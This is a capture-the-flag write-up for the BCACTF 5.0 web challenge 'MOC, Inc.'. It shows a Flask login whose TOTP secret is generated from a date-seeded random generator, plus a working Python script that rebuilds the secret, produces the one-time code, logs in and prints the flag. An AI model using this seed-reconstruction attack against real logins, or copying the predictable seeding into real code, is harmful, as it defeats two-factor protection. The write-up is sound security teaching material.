# BCACTF 5.0

## MOC, Inc.

> Towards the end of last month, we started receiving reports about suspicious activity coming from a company called MOC, Inc. Our investigative team has tracked down their secret company portal and cracked the credentials to the admin account, but could not bypass the advanced 2FA system. Can you find your way in?
> 
> *username: admin*
> *password: admin*
> 
> Author: Thomas
> 
> [`app.py`](app.py)

Tags: _web__

## Solution
For this challenge we get the source code for a small web app. It has a login where we can enter username, password and a 2FA code. The username and password is given to us in the description (both `admin`). The problem is the 2FA code. Lets check out the app source code, to see what else we can find.

![](login.png)

```python
@app.post('/')
def log_in():
    with sqlite3.connect('moc-inc.db') as db:
        result = db.cursor().execute(
            'SELECT totp_secret FROM user WHERE username = ? AND password = ?',
            (request.form['username'], request.form['password'])
        ).fetchone()

    if result == None:
        return render_template('portal.html', message='Invalid username/password.')

    totp = pyotp.TOTP(result[0])

    if totp.verify(request.form['totp']):
        with open('../flag.txt') as file:
            return render_template('portal.html', message=file.read())

    return render_template('portal.html', message='2FA code is incorrect.')
```

The login looks fairly ok. The `OTP secret` is fetched for the user, no obvious injection possible here. Then the `one time password` is generated using `pyotp`. There could be issues with the library of course, but lets see if we find anything else in this code.

```python
with sqlite3.connect('moc-inc.db') as db:
    db.cursor().execute('''CREATE TABLE IF NOT EXISTS user (
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        totp_secret TEXT NOT NULL
    )''')
    db.commit()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

        totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])

        with sqlite3.connect('moc-inc.db') as db:
            db.cursor().execute('''INSERT INTO user (
                username,
                password,
                totp_secret
            ) VALUES (?, ?, ?)''', (sys.argv[1], sys.argv[2], totp_secret))
            db.commit()

        print('Created user:')
        print('  Username:\t' + sys.argv[1])
        print('  Password:\t' + sys.argv[2])
        print('  TOTP Secret:\t' + totp_secret)

        exit(0)

    app.run()
```

If the script is run it connects to a `sqlite` database and creates a table `user` (if not existing). If the script is called with arguments it creates a user and stores the `totp_secret` to the user record. The secret is generated by choosing 20 random characters from an alphabet. That looks fine too.

```python
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])
```

Right at the top of the source file we find one interesting line. It initializes the random seed by using a string with format `Y-m-d`, so `2024-06-11` for instance. Thats obviously dangerous, since the seed is important for the generation of the `secret` and the seed resolution is very, very coarse.

```python
random.seed(datetime.datetime.today().strftime('%Y-%m-%d'))
```

So, if we can guess the day where the admin user was creates, we know the seed and with that we can just recreate the secret. In the description is mentioned `Towards the end of last month, we started receiving reports about suspicious activity..`, maybe thats an hint pointing to the correct date. So we start by `2024-05-31` and going backwards. 

One interestng bit. The verification function is called with only one parameter. The function has two optional parameters `for_time` and `valid_window` (which are both not specified). As a fallback `for_time` is chosen as `datetime.datetime.now()` [`totp.py:76`](https://github.com/pyauth/pyotp/blob/249674bf2814e1fcc3152c618514159cd44b4610/src/pyotp/totp.py#L76). So we just create the OTP also just in time.

The following script then calculates the secret for the specified date, calculates the `OTP` and tries to login. If successful it prints the flag. Then we can just manually adapt the day and see which day works.

```python
import datetime, random, pyotp, requests

random.seed("2024-05-27")
SECRET_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
totp_secret = ''.join([random.choice(SECRET_ALPHABET) for _ in range(20)])
print(f"secret = {totp_secret}")
totp = pyotp.TOTP(totp_secret)

time = datetime.datetime.now()
print(f"time = {time}")
print(f"OTP = {totp.at(time)}")

data = {
        "username": "admin",
        "password": "admin",
        "totp": f"{totp.at(time)}"
       }

resp = requests.post("http://challs.bcactf.com:31772/", data=data)
if "2FA code is incorrect" not in resp.text:
    print(resp.text)
else:
    print("fail")
```

```bash
$ python login.py
secret = ZID4OV36AMSVZJVLUMCN
time = 2024-06-12 00:04:27.733043
OTP = 158125
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0" />
        <title>MOC, Inc.</title>
    </head>
    <body>
        bcactf{rNg_noT_r4Nd0m_3n0uGH_a248dc91}
    </body>
</html>
```

Flag `bcactf{rNg_noT_r4Nd0m_3n0uGH_a248dc91}`